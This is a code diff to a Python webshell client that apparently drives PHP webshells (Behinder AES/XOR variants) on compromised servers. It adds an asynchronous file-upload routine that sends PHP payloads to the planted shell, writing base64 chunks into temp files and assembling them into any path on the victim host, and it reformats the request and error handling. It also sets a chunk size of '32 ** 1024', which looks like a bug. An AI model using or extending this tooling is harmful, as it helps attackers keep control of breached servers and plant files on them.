@@ -1,5 +1,6 @@
 """PHP Session的实现"""
 
+import asyncio
 import base64
 import hashlib
 import json
@@ -334,6 +335,9 @@ class PHPWebshell(PHPSessionInterface):
     def __init__(self, options: t.Union[None, PHPWebshellOptions]):
         self.options = options if options else PHPWebshellOptions()
         self.session_id = "".join(random.choices("1234567890abcdef", k=32))
+        # for upload file
+        self.chunk_size = 32 ** 1024
+        self.max_coro = 4
 
     def encode(self, payload: str) -> str:
         """应用编码器"""
@@ -426,6 +430,73 @@ class PHPWebshell(PHPSessionInterface):
         if result != "SUCCESS":
             raise exceptions.UnexpectedError("目标没有反馈移动成功")
 
+    async def upload_file(
+        self, filepath: str, content: bytes
+    ) -> bool:
+        sem = asyncio.Semaphore(self.max_coro)
+        chunk_size = self.chunk_size
+
+        async def upload_chunk(chunk: bytes):
+            code = """
+            $file = tempnam("", "");
+            $content = base64_decode('BASE64_CONTENT');
+            file_put_contents($file, $content);
+            echo $file;
+            """.replace(
+                "    ", ""
+            ).replace(
+                "BASE64_CONTENT", base64_encode(chunk)
+            )
+            async with sem:
+                result = await self.submit(code)
+            return result
+
+        uploaded_chunks = await asyncio.gather(
+            *[
+                upload_chunk(content[i * chunk_size : i * chunk_size + chunk_size])
+                for i in range(0, len(content), chunk_size)
+            ]
+        )
+        code = """
+        $files = json_decode(FILES);
+        $content = "";
+        $readerror = false;
+        foreach($files as &$file) {
+            if(!file_exists($file)) {
+                $readerror = true;
+            }
+            if(!$readerror) {
+                $content = $content . file_get_contents($file);
+            }
+            @unlink($file);
+        }
+        if(file_exists(FILENAME) && !is_writeable(FILENAME)) {
+            echo "WRONG_NO_PERMISSION";
+        }
+        else if(!file_exists(FILENAME) && !is_writeable(dirname(FILENAME))) {
+            echo "WRONG_NO_PERMISSION_DIR";
+        }
+        else if($readerror) {
+            echo "WRONG_READ_ERROR";
+        }else{
+            file_put_contents(FILENAME, $content);
+            echo "DONE";
+        }
+
+        """.replace(
+            "FILES", repr(json.dumps(uploaded_chunks))
+        ).replace(
+            "FILENAME", repr(filepath)
+        )
+        result = await self.submit(code)
+        if result == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限写入这个文件")
+        if result == "WRONG_NO_PERMISSION_DIR":
+            raise exceptions.FileError("没有权限写入这个文件夹")
+        if result == "WRONG_READ_ERROR":
+            raise exceptions.FileError("无法读取上传的暂存文件，难道是被删了？")
+        return result == "DONE"
+
     async def get_pwd(self) -> str:
         return await self.submit("echo __DIR__;")
 
@@ -488,11 +559,11 @@ class PHPWebshell(PHPSessionInterface):
                 f"受控端返回404, 没有这个webshell: {status_code}"
             )
         if status_code != 200:
-            raise exceptions.UnexpectedError(f"受控端返回了不正确的HTTP状态码: {status_code}")
-        if "POSTEXEC_FAILED" in text:
             raise exceptions.UnexpectedError(
-                "payload被执行，但运行失败"
+                f"受控端返回了不正确的HTTP状态码: {status_code}"
             )
+        if "POSTEXEC_FAILED" in text:
+            raise exceptions.UnexpectedError("payload被执行，但运行失败")
         idx_start = text.find(start)
         if idx_start == -1:
             raise exceptions.UnexpectedError(
@@ -713,7 +784,9 @@ class PHPWebshellBehinderAES(PHPWebshell):
     async def submit_raw(self, payload):
         data = behinder_aes(payload, self.key)
         try:
-            response = await self.client.request(method="POST", url=self.url, content=data)
+            response = await self.client.request(
+                method="POST", url=self.url, content=data
+            )
             return response.status_code, response.text
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
@@ -786,7 +859,9 @@ class PHPWebshellBehinderXor(PHPWebshell):
     async def submit_raw(self, payload):
         data = behinder_xor(payload, self.key)
         try:
-            response = await self.client.request(method="POST", url=self.url, content=data)
+            response = await self.client.request(
+                method="POST", url=self.url, content=data
+            )
             return response.status_code, response.text
         except httpx.TimeoutException as exc:
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
